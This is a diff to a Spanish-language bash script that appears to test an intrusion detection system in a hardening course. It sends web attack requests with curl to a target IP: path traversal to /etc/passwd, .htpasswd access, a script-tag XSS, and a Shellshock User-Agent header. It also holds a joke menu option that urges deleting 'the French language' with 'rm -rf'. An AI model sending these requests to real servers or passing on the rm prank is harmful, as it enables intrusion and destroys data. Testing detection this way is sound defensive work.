@@ -87,63 +87,68 @@ vIP="$1"
           1)
 
             echo ""
-            echo "  Intentando escalar hasta el archivo /etc/passwd del servidor..."
+            echo -e "${cColorAzulClaro}  Intentando escalar hasta el archivo /etc/passwd del servidor...${cFinColor}"
             echo ""
             # Alerta: Web.Server.Password.File.Access
-              curl -X GET -v "http://"$vIP":80/../../etc/passwd"
+              curl -v "http://"$vIP":80/../../etc/passwd"
+              echo ""
   
           ;;
 
           2)
 
             echo ""
-            echo "  Intentando acceder a las credenciales de autenticación de una carpeta..."
+            echo -e "${cColorAzulClaro}  Intentando acceder a las credenciales de autenticación de una carpeta...${cFinColor}"
             echo ""
             # Alerta: HTPasswd.Access
-              curl -X GET "http://"$vIP":80/.htpasswd"
-  
+              curl -v "http://"$vIP":80/.htpasswd"
+              echo ""
+
           ;;
 
           3)
 
             echo ""
-            echo "  Intentando inyectar código Javascript malicioso..."
+            echo -e "${cColorAzulClaro}  Intentando inyectar código Javascript malicioso...${cFinColor}"
             echo ""
             # Alerta: Cross.Site.Scripting
-              curl -X GET "http://"$vIP":80/search?query=<script>alert('XSS')</script>"
+              curl -v "http://"$vIP":80/search?query=<script>alert('XSS')</script>"
+              echo ""
 
           ;;
 
           4)
 
             echo ""
-            echo "  Intentando acceder al archivo passwd del servidor usando PHP..."
+            echo -e "${cColorAzulClaro}  Intentando acceder al archivo passwd del servidor usando PHP...${cFinColor}"
             echo ""
             # Alerta: Generic.Path.Traversal.Detection
-              curl -X GET "http://"$vIP":80/index.php?page=../../../../etc/passwd"
+              curl -v "http://"$vIP":80/index.php?page=../../../../etc/passwd"
+              echo ""
   
           ;;
 
           5)
 
             echo ""
-            echo "  Intentando ejecutar un comando de Bash en la cabecera TCP..."
+            echo -e "${cColorAzulClaro}  Intentando ejecutar un comando de Bash en la cabecera TCP...${cFinColor}"
             echo ""
             # Alerta: Bash.Function.Definitions.Remote.Code.Execution
-              curl -X GET "http://"$vIP":80" -H "User-Agent: () { :; }; echo 'Exploit'"
+              curl -v "http://"$vIP":80" -H "User-Agent: () { :; }; echo 'Exploit'"
+              echo ""
 
           ;;
 
           6)
 
             echo ""
-            echo "  Has suspendido bastionado, por listo!  Sin embargo..."
+            echo -e "${cColorRojo}  Has suspendido bastionado, por listo!  Sin embargo...${cFinColor}"
             echo ""
-            echo "  Si borras el idioma fránces del sistema, podrás sacar, al menos, un 5."
+            echo -e "${cColorRojo}  Si borras el idioma fránces del sistema, podrás sacar, al menos, un 5.${cFinColor}"
             echo ""
-            echo "  Puedes hacerlo con:"
+            echo -e "${cColorRojo}  Puedes hacerlo con:${cFinColor}"
             echo ""
-            echo "  rm -rf ...    (de Remove Muy Rapidly French)"
+            echo -e "${cColorRojo}  rm -rf ...    (de Remove Muy Rapidly French)${cFinColor}"
             echo ""
 
           ;;
